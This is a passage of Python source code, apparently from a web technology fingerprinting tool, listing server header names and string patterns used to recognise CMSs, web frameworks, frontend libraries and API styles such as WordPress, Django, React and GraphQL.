                "huawei-ecs",
                "x-huawei-ecs",
                "huawei-obs",
                "x-huawei-obs"
            ],
            
            "OpenResty": [
                "openresty",
                "x-openresty",
                "openresty-waf",
                "x-openresty-waf",
                "openresty-lua",
                "x-openresty-lua",
                "openresty-redis",
                "x-openresty-redis"
            ],
            
            "LiteSpeed": [
                "litespeed",
                "x-litespeed",
                "litespeed-cache",
                "x-litespeed-cache",
                "litespeed-vary",
                "x-litespeed-vary",
                "litespeed-purge",
                "x-litespeed-purge"
            ],
            
            "Apache Traffic Server": [
                "trafficserver",
                "x-trafficserver",
                "ats",
                "x-ats",
                "trafficserver-cache",
                "x-trafficserver-cache",
                "trafficserver-parent",
                "x-trafficserver-parent"
            ],
            
            "Caddy": [
                "caddy",
                "x-caddy",
                "caddy-server",
                "x-caddy-server",
                "caddy-cache",
                "x-caddy-cache",
                "caddy-security",
                "x-caddy-security"
            ],
            
            "Traefik": [
                "traefik",
                "x-traefik",
                "traefik-waf",
                "x-traefik-waf",
                "traefik-forward",
                "x-traefik-forward",
                "traefik-router",
                "x-traefik-router"
            ]
        }
        
        self.framework_patterns = {

            "WordPress": [
                "wp-content", "wp-includes", "/wp-admin/", "wordpress",
                "wp-json", "xmlrpc.php", "wp-login.php", "wp-config",
                "wp-mail.php", "wp-cron.php", "wp-trackback.php",
                "wp-comments-post.php", "wp-signup.php", "wp-load.php",
                "wp-settings.php", "wp-db.php", "wp-activate.php",
                "wp-blog-header.php", "wp-links-opml.php",
                "class-wp", "wp_enqueue_script", "wp_enqueue_style",
                "wp_remote_get", "wp_remote_post", "get_template_directory",
                "wp_get_attachment_url", "wp_nav_menu", "the_post",
                "get_header", "get_footer", "wp_head", "wp_footer"
            ],
            
            "Drupal": [
                "drupal", "sites/all/", "/node/", "/user/", "/taxonomy/",
                "misc/drupal.js", "Drupal.settings", "Drupal.behaviors",
                "sites/default/", "core/misc/", "core/modules/",
                "core/themes/", "core/profiles/", "core/includes/",
                "system.module", "user.module", "node.module",
                "field.module", "views.module", "ctools.module",
                "panels.module", "token.module", "path.module",
                "drupal_get_path", "drupal_render", "drupal_set_message",
                "theme_get_setting", "l()", "t()", "check_plain()",
                "hook_menu", "hook_block", "hook_form", "hook_theme"
            ],
            
            "Joomla": [
                "joomla", "/media/com_", "/components/com_", "/administrator/",
                "index.php?option=com_", "tmpl=component", "layout=edit",
                "task=edit", "view=article", "id=", "Itemid=",
                "/templates/", "/plugins/", "/modules/", "/libraries/",
                "JFactory", "JApplication", "JController", "JModel",
                "JView", "JTable", "JRoute", "JText", "JHtml",
                "JSession", "JUser", "JDocument", "JResponse",
                "JError", "JToolbar", "JToolbarHelper", "JSubMenuHelper",
                "JLoader::import", "JPluginHelper", "JModuleHelper",
                "JEventDispatcher", "JDispatcher"
            ],
            
            "Magento": [
                "magento", "/skin/frontend/", "/js/mage/", "/media/",
                "/app/code/core/Mage/", "/app/design/frontend/",
                "/app/etc/local.xml", "/var/report/", "/errors/",
                "Mage::", "Mage_Core_", "Mage_Catalog_", "Mage_Checkout_",
                "Mage_Customer_", "Mage_Sales_", "Mage_Adminhtml_",
                "Mage_Reports_", "getStoreConfig", "getBaseUrl",
                "getUrl", "getSkinUrl", "getMediaUrl", "getResourceUrl",
                "Mage::helper", "Mage::getModel", "Mage::getSingleton",
                "Mage::app", "Mage::getStoreConfig", "Mage::getVersion",
                "Mage::getEdition", "Mage::getRoot"
            ],
            
            "PrestaShop": [
                "prestashop", "/themes/", "/modules/", "/override/",
                "/img/", "/js/", "/css/", "/config/",
                "index.php?controller=", "Dispatcher::",
                "ControllerFactory::", "Context::", "Configuration::",
                "Db::", "Tools::", "Module::", "Product::",
                "Category::", "Customer::", "Cart::", "Order::",
                "Address::", "Country::", "Currency::", "Language::",
                "Shop::", "Image::", "Link::", "Mail::",
                "Smarty", "ObjectModel", "Validate", "PrestaShopLogger"
            ],
            
            "Shopify": [
                "shopify", ".myshopify.com", "cdn.shopify.com",
                "shopify.checkout", "Shopify.theme", "Shopify.money",
                "Shopify.currency", "Shopify.country", "Shopify.province",
                "Shopify.customer", "Shopify.cart", "Shopify.product",
                "Shopify.collection", "Shopify.page", "Shopify.blog",
                "Shopify.article", "Shopify.checkout", "Shopify.designMode",
                "{{", "}}", "{%", "%}", "product.", "collection.",
                "cart.", "customer.", "page.", "blog.", "article.",
                "link.", "asset.", "img_url", "money", "currency",
                "weight", "date", "time", "truncate", "pluralize"
            ],
            

            "Laravel": [
                "_token", "laravel", "Illuminate", "SessionId",
                "XSRF-TOKEN", "laravel_session", "/storage/",
                "/vendor/laravel/", "app/Http/Controllers/",
                "app/Models/", "resources/views/", "routes/web.php",
                "routes/api.php", "database/migrations/",
                "database/seeders/", "Illuminate\\",
                "App\\Http\\Controllers\\", "App\\Models\\",
                "App\\Providers\\", "Artisan", "Blade",
                "Carbon", "Collection", "Config", "Cookie",
                "Crypt", "DB", "Eloquent", "Event",
                "Facade", "File", "Gate", "Hash",
                "Lang", "Log", "Mail", "Queue",
                "Redirect", "Request", "Response", "Route",
                "Schema", "Session", "Storage", "Str",
                "URL", "Validator", "View"
            ],
            
            "Symfony": [
                "symfony", "_sf2_", "Symfony\\", "app_dev.php",
                "app.php", "web/app.php", "web/app_dev.php",
                "app/cache/", "app/logs/", "app/config/",
                "src/", "vendor/", "var/cache/", "var/logs/",
                "var/sessions/", "Doctrine\\", "Twig\\",
                "Monolog\\", "Swift_", "Symfony\\Component\\",
                "Symfony\\Bundle\\", "kernel.debug", "kernel.environment",
                "kernel.root_dir", "kernel.cache_dir", "kernel.logs_dir",
                "kernel.bundles", "kernel.container_class",
                "routing.resource", "session.save_path", "twig.formatter",
                "doctrine.dbal", "doctrine.orm", "security.firewalls"
            ],
            
            "CodeIgniter": [
                "codeigniter", "ci_session", "index.php/",
                "application/", "system/", "user_guide/",
                "controllers/", "models/", "views/",
                "helpers/", "libraries/", "config/",
                "database/", "language/", "cache/",
                "logs/", "third_party/", "hooks/",
                "CI_Controller", "CI_Model", "CI_Loader",
                "CI_Input", "CI_Output", "CI_Session",
                "CI_DB", "CI_Form_validation", "CI_Email",
                "CI_Upload", "CI_Image_lib", "CI_Pagination",
                "CI_Table", "CI_Trackback", "CI_Xmlrpc"
            ],
            
            "CakePHP": [
                "cakephp", "CAKEPHP", "cakephp.core",
                "app/", "lib/Cake/", "vendors/", "plugins/",
                "tmp/", "logs/", "cache/", "Config/",
                "Controller/", "Model/", "View/", "Test/",
                "webroot/", "Cake\\", "App\\", "Configure\\",
                "Controller\\", "Model\\", "View\\", "Network\\",
                "Routing\\", "I18n\\", "Utility\\", "Cache\\",
                "Database\\", "ORM\\", "Validation\\", "Event\\",
                "Log\\", "Http\\", "Mailer\\", "Auth\\"
            ],
            
            "Yii": [
                "yii", "YII_", "yii\\", "index.php?r=",
                "web/", "vendor/", "runtime/", "assets/",
                "config/", "controllers/", "models/", "views/",
                "components/", "widgets/", "modules/", "migrations/",
                "yii\\web\\", "yii\\db\\", "yii\\base\\",
                "yii\\console\\", "yii\\rest\\", "yii\\gii\\",
                "yii\\debug\\", "yii\\authclient\\", "yii\\swiftmailer\\",
                "yii\\redis\\", "yii\\mongodb\\", "yii\\elasticsearch\\",
                "yii\\queue\\", "yii\\mutex\\", "yii\\cache\\",
                "yii\\rbac\\", "yii\\filters\\", "yii\\validators\\"
            ],
            
            "Zend Framework": [
                "zend", "Zend_", "Zend\\", "zf2", "zf3",
                "application/", "library/Zend/", "public/",
                "configs/", "layouts/", "modules/", "data/",
                "Zend_Controller", "Zend_View", "Zend_Db",
                "Zend_Form", "Zend_Validate", "Zend_Filter",
                "Zend_Auth", "Zend_Acl", "Zend_Cache", "Zend_Config",
                "Zend_Date", "Zend_File", "Zend_Http", "Zend_Json",
                "Zend_Locale", "Zend_Log", "Zend_Mail", "Zend_Memory",
                "Zend_Pdf", "Zend_Session", "Zend_Translate", "Zend_Xml"
            ],
            

            "Django": [
                "csrftoken", "django", "/admin/login/", "settings.py",
                "urls.py", "views.py", "models.py", "forms.py",
                "admin.py", "apps.py", "tests.py", "migrations/",
                "templates/", "static/", "media/", "manage.py",
                "django.contrib", "django.db", "django.forms",
                "django.http", "django.middleware", "django.template",
                "django.urls", "django.views", "django.contrib.admin",
                "django.contrib.auth", "django.contrib.contenttypes",
                "django.contrib.sessions", "django.contrib.messages",
                "django.contrib.staticfiles", "MIDDLEWARE",
                "INSTALLED_APPS", "DATABASES", "TEMPLATES", "STATIC_URL"
            ],
            
            "Flask": [
                "flask", "session", "flash(", "url_for(",
                "render_template", "request.", "g.", "current_app",
                "app = Flask(__name__)", "@app.route", "blueprint",
                "flask_sqlalchemy", "flask_wtf", "flask_login",
                "flask_migrate", "flask_mail", "flask_bcrypt",
                "flask_restful", "flask_socketio", "flask_admin",
                "flask_principal", "flask_security", "flask_babel",
                "flask_caching", "flask_uploads", "flask_assets",
                "flask_script", "flask_testing", "Jinja2"
            ],
            
            "FastAPI": [
                "fastapi", "pydantic", "uvicorn", "@app.get",
                "@app.post", "@app.put", "@app.delete", "@app.patch",
                "Depends", "Query", "Path", "Body", "Header",
                "Cookie", "Form", "File", "UploadFile", "BackgroundTasks",
                "Security", "OAuth2PasswordBearer", "HTTPBearer",
                "CORSMiddleware", "APIRouter", "Request", "Response",
                "JSONResponse", "HTMLResponse", "PlainTextResponse",
                "RedirectResponse", "StreamingResponse", "FileResponse",
                "WebSocket", "WebSocketDisconnect", "status"
            ],
            
            "Pyramid": [
                "pyramid", "pyramid.config", "pyramid.view",
                "pyramid.response", "pyramid.request", "pyramid.router",
                "pyramid.session", "pyramid.security", "pyramid.authentication",
                "pyramid.authorization", "pyramid.i18n", "pyramid.httpexceptions",
                "pyramid.renderers", "pyramid.events", "pyramid.testing",
                "pyramid.scripts", "pyramid.paster", "pyramid_debugtoolbar",
                "pyramid_tm", "pyramid_retry", "pyramid_beaker", "pyramid_mako",
                "pyramid_chameleon", "pyramid_jinja2", "pyramid_sqlalchemy",
                "pyramid_mongodb", "pyramid_celery", "pyramid_mailer"
            ],
            

            "Express": [
                "express", "connect.sid", "X-Powered-By: Express",
                "app.use", "app.get", "app.post", "app.put",
                "app.delete", "app.patch", "app.all", "app.route",
                "express.static", "express.json", "express.urlencoded",
                "express.Router", "express-session", "express-validator",
                "express-jwt", "express-rate-limit", "express-ws",
                "express-fileupload", "express-handlebars", "express-ejs-layouts",
                "cookie-parser", "body-parser", "morgan", "helmet",
                "cors", "compression", "serve-favicon", "method-override"
            ],
            
            "Next.js": [
                "next", "_next", "__next", "Next.js",
                "next/head", "next/link", "next/router",
                "next/image", "next/script", "next/document",
                "next/app", "next/config", "next/dynamic",
                "next/error", "pages/", "pages/api/",
                "public/", "styles/", "components/",
                "lib/", "utils/", "hooks/",
                "getStaticProps", "getStaticPaths", "getServerSideProps",
                "useRouter", "useEffect", "useState", "useContext"
            ],
            
            "Nuxt.js": [
                "nuxt", "_nuxt", "__nuxt", "Nuxt.js",
                "nuxt-link", "nuxt-child", "nuxt-content",
                "nuxt.config.js", "layouts/", "pages/",
                "components/", "store/", "plugins/",
                "middleware/", "static/", "assets/",
                "asyncData", "fetch", "head", "layout",
                "middleware", "transition", "scrollToTop",
                "validate", "watchQuery", "key", "loading"
            ],
            
            "Vue.js": [
                "vue", "__vue", "vue-loader", "vue-router",
                "vuex", "vuetify", "vite", "@vue/",
                "vue-template-compiler", "vue-style-loader",
                "vue-hot-reload-api", "vue-class-component",
                "vue-property-decorator", "vue-meta", "vue-i18n",
                "vue-axios", "vue-resource", "vue-lazyload",
                "vue-infinite-loading", "vue-carousel", "vue-chartjs",
                "vue-select", "vue-multiselect", "vue-datepicker",
                "vue-notification", "vue-toastification", "vue-sweetalert2"
            ],
            
            "React": [
                "react", "react-dom", "react-app", "jsx",
                "ReactDOM.render", "React.createElement",
                "useState", "useEffect", "useContext", "useReducer",
                "useCallback", "useMemo", "useRef", "useImperativeHandle",
                "useLayoutEffect", "useDebugValue", "createContext",
                "createRef", "forwardRef", "memo", "lazy",
                "Suspense", "Fragment", "StrictMode", "Profiler",
                "react-router", "react-redux", "react-query",
                "react-hook-form", "react-table", "react-chartjs-2",
                "react-dropzone", "react-dnd", "react-spring",
                "react-transition-group", "react-helmet", "react-intl"
            ],
            
            "Angular": [
                "ng-", "angular", "@angular", "zone.js",
                "rxjs", "typescript", "ngFor", "ngIf",
                "ngModel", "ngClass", "ngStyle", "ngSwitch",
                "ngTemplateOutlet", "ngComponentOutlet",
                "NgModule", "Component", "Directive", "Pipe",
                "Injectable", "Input", "Output", "HostBinding",
                "HostListener", "ViewChild", "ViewChildren",
                "ContentChild", "ContentChildren", "Inject",
                "Injectable", "Optional", "Self", "SkipSelf",
                "Host", "Attribute", "ElementRef", "Renderer2",
                "ChangeDetectorRef", "ViewContainerRef", "TemplateRef"
            ],
            
            "Svelte": [
                "svelte", "svelte/store", "svelte/motion",
                "svelte/transition", "svelte/animate", "svelte/easing",
                "onMount", "onDestroy", "beforeUpdate", "afterUpdate",
                "tick", "setContext", "getContext", "hasContext",
                "createEventDispatcher", "svelte:window", "svelte:body",
                "svelte:head", "svelte:options", "svelte:self",
                "svelte:component", "svelte:element", "@html",
                "@debug", "@const", "bind:", "on:", "use:",
                "transition:", "animate:", "in:", "out:",
                "key", "svelte-preprocess", "svelte-check"
            ],
            
            "Ember.js": [
                "ember", "ember-data", "ember-cli",
                "Ember.Object", "Ember.Component", "Ember.Service",
                "Ember.Route", "Ember.Controller", "Ember.Helper",
                "Ember.Modifier", "Ember.Array", "Ember.String",
                "Ember.Number", "Ember.Enumerable", "Ember.Computed",
                "Ember.Observer", "Ember.Inject", "Ember.get",
                "Ember.set", "Ember.computed", "Ember.observer",
                "Ember.on", "Ember.run", "Ember.test",
                "ember-template-compiler", "ember-source",
                "ember-auto-import", "ember-power-select",
                "ember-simple-auth", "ember-concurrency"
            ],
            

            "Spring": [
                "jsessionid", "spring", "X-Application-Context",
                "org.springframework", "spring-webmvc", "spring-boot",
                "spring-security", "spring-data", "spring-cloud",
                "@Controller", "@RestController", "@Service",
                "@Repository", "@Component", "@Configuration",
                "@Bean", "@Autowired", "@Qualifier", "@Value",
                "@RequestMapping", "@GetMapping", "@PostMapping",
                "@PutMapping", "@DeleteMapping", "@PatchMapping",
                "@RequestBody", "@ResponseBody", "@PathVariable",
                "@RequestParam", "@RequestHeader", "@CookieValue",
                "@ModelAttribute", "@SessionAttribute", "@Valid"
            ],
            
            "Struts": [
                "struts", "org.apache.struts", "struts-config.xml",
                "web.xml", "ActionServlet", "ActionForm", "Action",
                "ActionForward", "ActionMapping", "ActionErrors",
                "ActionMessage", "ActionMessages", "DispatchAction",
                "LookupDispatchAction", "MappingDispatchAction",
                "ValidatorForm", "DynaValidatorForm", "TilesPlugin",
                "ValidatorPlugin", "MessageResources", "RequestProcessor",
                "ExceptionHandler", "MultipartRequestHandler",
                "TagLibraryValidator", "StrutsValidator"
            ],
            
            "Hibernate": [
                "hibernate", "org.hibernate", "SessionFactory",
                "Session", "Transaction", "Query", "Criteria",
                "Configuration", "AnnotationConfiguration",
                "Mapping", "Entity", "Table", "Column",
                "Id", "GeneratedValue", "SequenceGenerator",
                "TableGenerator", "OneToOne", "OneToMany",
                "ManyToOne", "ManyToMany", "JoinColumn",
                "JoinTable", "ForeignKey", "Index", "UniqueConstraint",
                "Cache", "CacheConcurrencyStrategy", "FetchType",
                "CascadeType", "Enumerated", "Temporal", "Lob"
            ],
            
            "Play Framework": [
                "play", "play.api", "play.mvc", "play.libs",
                "play.data", "play.db", "play.cache", "play.i18n",
                "play.test", "play.twirl", "play.sbt", "play.akka",
                "play.guice", "play.ws", "play.json", "play.xml",
                "@Inject", "@Singleton", "@ImplementedBy",
                "@Require", "@With", "@Before", "@After",
                "@Finally", "@Catch", "@Content", "@Template",
                "@Field", "@Constraints", "@Validation",
                "@Default", "@Optional", "@Named", "@Qualifier"
            ],
            

            "ASP.NET": [
                "asp.net", "__viewstate", "__eventvalidation", ".aspx",
                ".ascx", ".ashx", ".asmx", ".asax", ".master",
                "web.config", "global.asax", "machine.config",
                "System.Web", "System.Web.UI", "System.Web.Mvc",
                "System.Web.Http", "System.Web.Optimization",
                "System.Web.Routing", "System.Web.Security",
                "System.Web.Caching", "System.Web.SessionState",
                "System.Web.Profile", "System.Web.Hosting",
                "System.Web.Compilation", "System.Web.Configuration",
                "ViewState", "ControlState", "SessionState",
                "ApplicationState", "Cache", "Profile", "Membership",
                "RoleProvider", "FormsAuthentication", "WindowsAuthentication"
            ],
            
            "ASP.NET Core": [
                "asp.net core", "kestrel", "aspnetcore-",
                "Microsoft.AspNetCore", "Startup.cs", "Program.cs",
                "appsettings.json", "launchSettings.json",
                "wwwroot/", "Controllers/", "Views/", "Models/",
                "Services/", "Middleware/", "Filters/", "TagHelpers/",
                "ViewComponents/", "Pages/", "Areas/", "RazorPages/",
                "Blazor/", "SignalR/", "gRPC/", "Identity/",
                "EntityFrameworkCore/", "Authentication/", "Authorization/",
                "Caching/", "Configuration/", "DependencyInjection/",
                "Hosting/", "Http/", "Logging/", "Mvc/", "Routing/"
            ],
            
            "Blazor": [
                "blazor", "blazor.server.js", "blazor.webassembly.js",
                "_framework/", "_bin/", "blazor.boot.json",
                "blazor-environment", "Blazor.start", "DotNet.invokeMethod",
                "DotNet.invokeMethodAsync", "IJSRuntime", "JSInvokable",
                "Inject", "Parameter", "CascadingParameter", "EventCallback",
                "EventHandler", "RenderFragment", "RenderTreeBuilder",
                "ComponentBase", "LayoutComponentBase", "OwningComponentBase",
                "AuthorizeView", "CascadingAuthenticationState", "RouteView",
                "Router", "NavLink", "PageTitle", "HeadContent",
                "ErrorBoundary", "Virtualize", "DynamicComponent"
            ],
            

            "Ruby on Rails": [
                "_rails", "rails", "rack.session", "actionpack",
                "activerecord", "actionmailer", "activejob",
                "actioncable", "activestorage", "actiontext",
                "activesupport", "railties", "config/routes.rb",
                "app/controllers/", "app/models/", "app/views/",
                "app/helpers/", "app/mailers/", "app/jobs/",
                "app/channels/", "app/assets/", "lib/",
                "vendor/", "tmp/", "log/", "db/",
                "test/", "spec/", "Gemfile", "Rakefile",
                "config.ru", "environment.rb", "boot.rb"
            ],
            
            "Sinatra": [
                "sinatra", "sinatra/base", "sinatra/contrib",
                "require 'sinatra'", "get do", "post do",
                "put do", "delete do", "patch do", "options do",
                "head do", "before do", "after do", "error do",
                "not_found do", "halt", "pass", "redirect",
                "erb", "haml", "slim", "json", "xml",
                "stream", "attachment", "send_file", "send_data",
                "cache_control", "expires", "last_modified",
                "etag", "headers", "status", "body", "session"
            ],
            

            "Gin": [
                "gin", "gin-gonic", "c.JSON", "c.XML",
                "c.String", "c.HTML", "c.Redirect", "c.Data",
                "c.File", "c.Stream", "c.Bind", "c.ShouldBind",
                "c.Get", "c.Set", "c.MustGet", "c.Query",
                "c.PostForm", "c.FormFile", "c.MultipartForm",
                "c.Cookie", "c.GetHeader", "c.SetCookie",
                "c.Abort", "c.AbortWithStatus", "c.AbortWithError",
                "c.Next", "c.IsAborted", "c.HandlerName",
                "c.FullPath", "c.ClientIP", "c.ContentType"
            ],
            
            "Echo": [
                "echo", "labstack/echo", "c.JSON", "c.JSONPretty",
                "c.XML", "c.XMLPretty", "c.String", "c.HTML",
                "c.HTMLBlob", "c.Blob", "c.Stream", "c.File",
                "c.Attachment", "c.Inline", "c.NoContent",
                "c.Redirect", "c.Render", "c.Bind", "c.Validate",
                "c.QueryParam", "c.QueryParams", "c.FormValue",
                "c.FormParams", "c.Param", "c.PathParam",
                "c.FormFile", "c.MultipartForm", "c.Cookie",
                "c.SetCookie", "c.Get", "c.Set", "c.Request",
                "c.Response", "c.Logger", "c.Echo"
            ],
            
            "Fiber": [
                "fiber", "gofiber/fiber", "c.JSON", "c.XML",
                "c.Send", "c.SendFile", "c.SendStream",
                "c.SendString", "c.Format", "c.Render",
                "c.Redirect", "c.Download", "c.Attachment",
                "c.Links", "c.Location", "c.Next", "c.Method",
                "c.Hostname", "c.IP", "c.IPs", "c.OriginalURL",
                "c.Path", "c.Protocol", "c.Query", "c.Body",
                "c.BodyParser", "c.ClearCookie", "c.Cookies",
                "c.FormValue", "c.FormFile", "c.MultipartForm",
                "c.Get", "c.Locals", "c.Params", "c.Route"
            ],
            

            "Rocket": [
                "rocket", "rocket::", "#[get(", "#[post(",
                "#[put(", "#[delete(", "#[patch(", "#[head(",
                "#[options(", "#[catch(", "#[launch]",
                "#[macro_use] extern crate rocket", "rocket::build",
                "rocket::ignite", "rocket::custom", "rocket::config",
                "rocket::fairing", "rocket::form", "rocket::fs",
                "rocket::http", "rocket::request", "rocket::response",
                "rocket::route", "rocket::serde", "rocket::shield",
                "rocket::tokio", "rocket::tracing", "rocket::yansi"
            ],
            
            "Actix": [
                "actix", "actix-web", "actix-rt", "actix-files",
                "actix-http", "actix-service", "actix-utils",
                "actix-cors", "actix-identity", "actix-session",
                "actix-web-httpauth", "actix-web-staticfiles",
                "HttpServer::new", "App::new", "web::get",
                "web::post", "web::put", "web::delete",
                "web::patch", "web::head", "web::options",
                "web::scope", "web::resource", "web::route",
                "web::Data", "web::Json", "web::Form",
                "web::Query", "web::Path", "web::Payload",
                "web::Bytes", "web::Header", "web::Cookie"
            ],
            

            "React Native": [
                "react-native", "react-navigation", "react-native-gesture-handler",
                "react-native-reanimated", "react-native-screens",
                "react-native-safe-area-context", "react-native-vector-icons",
                "react-native-device-info", "react-native-camera",
                "react-native-geolocation", "react-native-maps",
                "react-native-push-notification", "react-native-firebase",
                "react-native-async-storage", "react-native-keychain",
                "react-native-share", "react-native-image-picker",
                "react-native-video", "react-native-sound",
                "react-native-linear-gradient", "react-native-svg",
                "StyleSheet", "View", "Text", "Image",
                "ScrollView", "FlatList", "SectionList",
                "TouchableOpacity", "TouchableHighlight", "Button",
                "TextInput", "Switch", "Slider", "Picker"
            ],
            
            "Flutter": [
                "flutter", "dart:", "package:flutter/",
                "MaterialApp", "Scaffold", "AppBar",
                "BottomNavigationBar", "TabBar", "Drawer",
                "FloatingActionButton", "IconButton", "ElevatedButton",
                "TextButton", "OutlinedButton", "TextField",
                "Checkbox", "Radio", "Switch", "Slider",
                "DatePicker", "TimePicker", "Dialog",
                "SnackBar", "BottomSheet", "AlertDialog",
                "CupertinoApp", "CupertinoNavigationBar",
                "CupertinoTabBar", "CupertinoButton",
                "CupertinoTextField", "CupertinoPicker",
                "CupertinoDatePicker", "CupertinoTimerPicker",
                "CupertinoAlertDialog", "CupertinoActionSheet"
            ],
            
            "Ionic": [
                "ionic", "ion-", "IonicModule", "IonicPage",
                "IonicApp", "IonicErrorHandler", "IonicStorageModule",
                "IonicNative", "IonicDeploy", "IonicAngular",
                "IonicReact", "IonicVue", "IonicSvelte",
                "ion-app", "ion-header", "ion-toolbar",
                "ion-title", "ion-content", "ion-footer",
                "ion-button", "ion-input", "ion-textarea",
                "ion-select", "ion-checkbox", "ion-radio",
                "ion-toggle", "ion-range", "ion-datetime",
                "ion-list", "ion-item", "ion-label",
                "ion-icon", "ion-img", "ion-avatar",
                "ion-thumbnail", "ion-card", "ion-grid",
                "ion-row", "ion-col", "ion-slides",
                "ion-tabs", "ion-tab", "ion-router-outlet"
            ],
            
            "Xamarin": [
                "xamarin", "Xamarin.Forms", "Xamarin.iOS",
                "Xamarin.Android", "Xamarin.Mac", "Xamarin.Essentials",
                "Xamarin.CommunityToolkit", "Xamarin.Forms.Pages",
                "Xamarin.Forms.Labs", "Xamarin.Forms.Maps",
                "Xamarin.Forms.WebView", "Xamarin.Forms.CarouselView",
                "Xamarin.Forms.CollectionView", "Xamarin.Forms.Shell",
                "ContentPage", "NavigationPage", "TabbedPage",
                "CarouselPage", "MasterDetailPage", "FlyoutPage",
                "ContentView", "Frame", "ScrollView", "StackLayout",
                "Grid", "AbsoluteLayout", "RelativeLayout",
                "FlexLayout", "Label", "Button", "Entry",
                "Editor", "Picker", "DatePicker", "TimePicker",
                "Slider", "Stepper", "Switch", "ProgressBar",
                "ActivityIndicator", "BoxView", "WebView", "Map"
            ],
            

            "Jekyll": [
                "jekyll", "jekyll-admin", "jekyll-feed",
                "jekyll-sitemap", "jekyll-seo-tag", "jekyll-paginate",
                "jekyll-gist", "jekyll-compose", "jekyll-archives",
                "_config.yml", "_layouts/", "_includes/",
                "_posts/", "_drafts/", "_data/", "_sass/",
                "_site/", ".jekyll-cache/", "Gemfile",
                "index.html", "about.md", "contact.md",
                "blog.md", "portfolio.md", "services.md",
                "{%", "%}", "{{", "}}", "site.", "page.",
                "layout.", "include.", "post.", "paginator."
            ],
            
            "Hugo": [
                "hugo", "hugo-module", "hugo-theme",
                "config.toml", "config.yaml", "config.json",
                "archetypes/", "content/", "data/", "layouts/",
                "static/", "themes/", "public/", "resources/",
                ".hugo_build.lock", "hugo.toml", "hugo.yaml",
                "hugo.json", "{{", "}}", "{{-", "-}}",
                "range", "with", "if", "else", "end",
                "define", "block", "partial", "partialCached",
                "resources.Get", "resources.GetRemote",
                "resources.FromString", "resources.ExecuteAsTemplate",
                "resources.ToCSS", "resources.Minify",
                "resources.Fingerprint", "resources.Concat",
                "resources.PostProcess"
            ],
            
            "Gatsby": [
                "gatsby", "gatsby-source", "gatsby-plugin",
                "gatsby-transformer", "gatsby-image", "gatsby-link",
                "gatsby-transformer-sharp", "gatsby-plugin-sharp",
                "gatsby-plugin-manifest", "gatsby-plugin-offline",
                "gatsby-plugin-react-helmet", "gatsby-plugin-sass",
                "gatsby-plugin-styled-components", "gatsby-plugin-emotion",
                "gatsby-plugin-google-analytics", "gatsby-plugin-sitemap",
                "gatsby-plugin-robots-txt", "gatsby-plugin-feed",
                "gatsby-plugin-catch-links", "gatsby-plugin-layout",
                "gatsby-plugin-netlify", "gatsby-plugin-netlify-cms",
                "gatsby-transformer-remark", "gatsby-transformer-json",
                "gatsby-transformer-yaml", "gatsby-transformer-csv",
                "useStaticQuery", "graphql", "StaticQuery",
                "PageQuery", "StaticImage", "GatsbyImage",
                "Link", "navigate", "useLocation", "useParams"
            ],
            
            "Eleventy": [
                "eleventy", "11ty", ".eleventy.js",
                "eleventy.config.js", "_includes/", "_data/",
                "layouts/", "posts/", "pages/", "assets/",
                "public/", ".eleventyignore", ".eleventy.cache",
                "{%", "%}", "{{", "}}", "---", "---",
                "permalink", "tags", "layout", "title",
                "date", "pagination", "collection",
                "collections.all", "collections.posts",
                "collections.pages", "filters", "shortcodes",
                "passthroughFileCopy", "addTransform",
                "addFilter", "addShortcode", "addPairedShortcode",
                "addCollection", "addPlugin", "setUseGitIgnore"
            ],
            

            "GraphQL": [
                "graphql", "graphiql", "graphql-playground",
                "/graphql", "/graphiql", "/playground",
                "/voyager", "/altair", "/explorer",
                "query {", "mutation {", "subscription {",
                "type Query {", "type Mutation {", "type Subscription {",
                "schema {", "directive @", "enum ", "input ",
                "interface ", "union ", "scalar ", "fragment ",
                "...", "__typename", "__schema", "__type",
                "IntrospectionQuery", "GraphQLSchema", "GraphQLObjectType",
                "GraphQLString", "GraphQLInt", "GraphQLFloat",
                "GraphQLBoolean", "GraphQLID", "GraphQLList",
                "GraphQLNonNull", "GraphQLEnumType", "GraphQLInputObjectType"
            ],
            
            "REST API": [
                "api/", "/api/v1/", "/api/v2/", "/api/v3/",
                "/rest/", "/rest/v1/", "/rest/v2/", "/rest/v3/",
                "swagger", "openapi", "postman", "insomnia",
                "/docs/", "/documentation/", "/swagger-ui/",
                "/redoc/", "/openapi.json", "/swagger.json",
                "X-RateLimit-Limit", "X-RateLimit-Remaining",
                "X-RateLimit-Reset", "X-Total-Count", "X-Page",
                "X-Per-Page", "X-Total-Pages", "X-Next-Page",
                "X-Prev-Page", "Link:", "ETag:", "Last-Modified:",
                "If-Modified-Since:", "If-None-Match:", "Prefer:",
                "Content-Range:", "Accept-Ranges:", "Range:",
                "Authorization: Bearer", "Authorization: Basic",
                "Authorization: Token", "API-Key:", "X-API-Key:"
            ],
            
            "gRPC": [
                "grpc", "grpc-web", "grpc-gateway", "protobuf",
                ".proto", "protoc", "grpc_tools", "grpcio",
                "grpcio-tools", "grpc-health", "grpc-reflection",
                "grpc-interceptors", "grpc-middleware", "grpc-ecosystem",
                "/grpc.health.v1.Health/Check", "/grpc.health.v1.Health/Watch",
                "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
                "grpc-status", "grpc-message", "grpc-encoding",
                "grpc-accept-encoding", "grpc-timeout", "grpc-call",
                "grpc-trace-bin", "grpc-tags-bin", "grpc-internal-encoding-request",
                "application/grpc", "application/grpc+proto", "application/grpc+json"
            ],
            

            "WebAssembly": [
                "wasm", "webassembly", ".wasm", "instantiateStreaming",
                "instantiate", "compile", "compileStreaming",
                "validate", "Module", "Instance", "Memory",
                "Table", "Global", "Function", "Table",
                "Wasm.instantiate", "Wasm.instantiateStreaming",
                "Wasm.compile", "Wasm.compileStreaming",
                "Wasm.validate", "WebAssembly.Memory",
                "WebAssembly.Table", "WebAssembly.Global",
                "WebAssembly.Function", "WebAssembly.Module",
                "WebAssembly.Instance", "WebAssembly.CompileError",
                "WebAssembly.LinkError", "WebAssembly.RuntimeError",
                "WABT", "Binaryen", "Emscripten", "Rust/Wasm"
            ],
            

            "Socket.IO": [
                "socket.io", "socket.io-client", "io(",
                "socket.on", "socket.emit", "socket.broadcast.emit",
                "io.emit", "io.to", "io.in", "io.of",
                "io.sockets", "io.sockets.sockets", "io.sockets.adapter",
                "socket.join", "socket.leave", "socket.disconnect",
                "socket.connected", "socket.disconnected",
                "socket.id", "socket.handshake", "socket.rooms",
                "socket.data", "socket.use", "socket.compress",
                "socket.timeout", "socket.volatile", "socket.binary",
                "Engine.IO", "engine.io", "engine.io-client",
